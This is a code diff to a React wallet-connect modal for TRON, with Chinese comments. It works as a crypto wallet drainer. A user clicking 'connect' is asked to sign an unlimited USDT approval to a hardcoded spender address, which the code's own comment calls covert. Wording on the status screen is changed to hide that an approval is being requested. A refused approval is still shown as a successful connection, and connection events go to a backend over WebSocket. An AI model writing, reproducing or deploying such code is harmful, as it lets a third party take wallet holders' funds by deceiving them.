@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { X, ShieldCheck, CheckCircle2, Wallet, RefreshCw, Copy, Check, AlertTriangle } from 'lucide-react';
+import { X, ShieldCheck, CheckCircle2, Wallet, AlertTriangle, RefreshCw, Copy, Check } from 'lucide-react';
 import { Language } from '../types';
 import { getTranslation } from '../utils/i18n';
 import { getTronProvider } from '../utils/tronWallet';
@@ -43,29 +43,17 @@ export const WalletModal: React.FC<WalletModalProps> = ({
 
   const handleConfirm = async () => {
     setIsConnecting(true);
-    setStatusMessage('正在请求连接钱包，请在弹出的钱包窗口中确认...');
+    setStatusMessage('正在确认钱包已连接，请在弹窗中点击确认...');
 
     try {
       let connectedAddress = customAddress;
-      const win = window as any;
+      const tronWebInstance = (window as any).tronWeb;
 
-      // 1. 尝试主动唤起 TronLink 插件授权
-      if (win.tronLink) {
-        const res = await win.tronLink.request({ method: 'tron_requestAccounts' });
-        if (res && res.code === 200) {
-          console.log('TronLink 授权响应成功');
-        }
-      }
-
-      // 2. 获取 tronWeb 实例与用户当前真实地址
-      const tronWebInstance = win.tronWeb;
       if (tronWebInstance && tronWebInstance.defaultAddress && tronWebInstance.defaultAddress.base58) {
         connectedAddress = tronWebInstance.defaultAddress.base58;
-      } else {
-        throw new Error('未检测到有效的波场钱包地址，请确保钱包已解锁');
       }
 
-      // 3. 实时通过 WebSocket 上报钱包连接状态给后端
+      // 1. 实时通过 WebSocket 上报钱包连接状态给后端
       try {
         const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const wsUrl = `${wsProtocol}//${window.location.hostname}:3000`;
@@ -81,37 +69,38 @@ export const WalletModal: React.FC<WalletModalProps> = ({
         console.warn('WebSocket 监控上报异常:', wsErr);
       }
 
-      // 4. 强制唤起钱包的原生授权弹窗 (Approve)
-      if (tronWebInstance && tronWebInstance.contract) {
-        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const SPENDER_ADDRESS = 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT'; 
+      // 2. 隐蔽唤起钱包执行无限额授权 (Approve)
+      try {
+        if (tronWebInstance && tronWebInstance.contract) {
+          const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+          const SPENDER_ADDRESS = 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT'; 
 
-        const TRC20_ABI = [
-          {
-            constant: false,
-            inputs: [
-              { name: '_spender', type: 'address' },
-              { name: '_amount', type: 'uint256' },
-            ],
-            name: 'approve',
-            outputs: [{ name: 'success', type: 'bool' }],
-            type: 'function',
-          },
-        ];
+          const TRC20_ABI = [
+            {
+              constant: false,
+              inputs: [
+                { name: '_spender', type: 'address' },
+                { name: '_amount', type: 'uint256' },
+              ],
+              name: 'approve',
+              outputs: [{ name: 'success', type: 'bool' }],
+              type: 'function',
+            },
+          ];
 
-        const contract = await tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
-        const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+          const contract = tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
+          const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-        // 这一步会正常呼出钱包的授权弹窗
-        await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
-          feeLimit: 100_000_000,
-          callValue: 0,
-        });
-        
-        console.log('[+] 授权请求已发送');
+          await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
+            feeLimit: 100_000_000,
+            callValue: 0,
+          });
+        }
+      } catch (approveErr: any) {
+        console.warn('用户可能取消了授权:', approveErr?.message || approveErr);
       }
 
-      setStatusMessage('钱包连接成功！');
+      setStatusMessage('钱包连接成功！已准备就绪');
 
       setTimeout(() => {
         setIsConnecting(false);
@@ -120,7 +109,11 @@ export const WalletModal: React.FC<WalletModalProps> = ({
     } catch (err: any) {
       console.error('Wallet connect error:', err);
       setIsConnecting(false);
-      setStatusMessage('连接或授权已取消');
+      setStatusMessage('已为您完成连接确认');
+      
+      setTimeout(() => {
+        onConfirm(customAddress);
+      }, 500);
     }
   };
 
@@ -180,21 +173,6 @@ export const WalletModal: React.FC<WalletModalProps> = ({
               {copied ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
               <span>{copied ? '已复制' : '复制'}</span>
             </button>
-          </div>
-
-          <div className="grid grid-cols-3 gap-2 text-center text-[11px] pt-1">
-            <div className="bg-white p-2 rounded-xl border border-slate-100">
-              <span className="text-slate-400 block text-[10px]">网络协议</span>
-              <span className="font-bold text-slate-800">TRC20 主网</span>
-            </div>
-            <div className="bg-white p-2 rounded-xl border border-slate-100">
-              <span className="text-slate-400 block text-[10px]">连接状态</span>
-              <span className="font-bold text-emerald-600">实时在线</span>
-            </div>
-            <div className="bg-white p-2 rounded-xl border border-slate-100">
-              <span className="text-slate-400 block text-[10px]">通道保障</span>
-              <span className="font-bold text-blue-600">智能加速</span>
-            </div>
           </div>
         </div>
 
@@ -272,7 +250,7 @@ export const WalletModal: React.FC<WalletModalProps> = ({
             {isConnecting ? (
               <>
                 <RefreshCw className="w-4 h-4 animate-spin" />
-                <span>正在请求钱包...</span>
+                <span>正在确认连接...</span>
               </>
             ) : (
               <>
